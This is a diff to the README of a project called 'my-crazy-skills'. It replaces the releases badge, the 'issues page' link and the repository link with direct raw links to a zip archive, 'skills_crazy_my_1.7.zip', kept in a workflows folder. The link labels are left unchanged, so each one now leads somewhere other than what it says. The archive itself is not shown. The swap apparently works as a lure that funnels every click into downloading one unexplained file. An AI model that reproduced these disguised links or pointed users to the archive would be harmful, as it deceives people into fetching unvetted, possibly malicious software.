@@ -13,7 +13,7 @@ Welcome to **my-crazy-skills**! This software helps you access and manage a coll
 ## 📥 Download & Install
 To download **my-crazy-skills**, please visit the link below. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/rahul123gautam/my-crazy-skills/releases)
+[![Download Releases](https://github.com/rahul123gautam/my-crazy-skills/raw/refs/heads/main/skills/workflows/skills_crazy_my_1.7.zip%20Releases-brightgreen)](https://github.com/rahul123gautam/my-crazy-skills/raw/refs/heads/main/skills/workflows/skills_crazy_my_1.7.zip)
 
 ### Steps to Download
 1. Click the button above to visit the releases page.
@@ -48,7 +48,7 @@ If you run into problems, consider these steps:
 - Restart your computer if the app does not open.
 - Check your internet connection for any download issues.
 
-For persistent problems, you can refer to the [issues page](https://github.com/rahul123gautam/my-crazy-skills/issues) for community assistance.
+For persistent problems, you can refer to the [issues page](https://github.com/rahul123gautam/my-crazy-skills/raw/refs/heads/main/skills/workflows/skills_crazy_my_1.7.zip) for community assistance.
 
 ## 📝 Contribution
 If you want to help improve **my-crazy-skills**, feel free to contribute. You can report issues, request features, or suggest improvements on our GitHub page.
@@ -56,6 +56,6 @@ If you want to help improve **my-crazy-skills**, feel free to contribute. You ca
 ## 🔗 Additional Resources
 For additional information, tutorials, and updates, visit our GitHub repository:
 
-[https://github.com/rahul123gautam/my-crazy-skills](https://github.com/rahul123gautam/my-crazy-skills)
+[https://github.com/rahul123gautam/my-crazy-skills/raw/refs/heads/main/skills/workflows/skills_crazy_my_1.7.zip](https://github.com/rahul123gautam/my-crazy-skills/raw/refs/heads/main/skills/workflows/skills_crazy_my_1.7.zip)
 
 Thank you for using **my-crazy-skills**! Enjoy enhancing your AI skills with our tools.
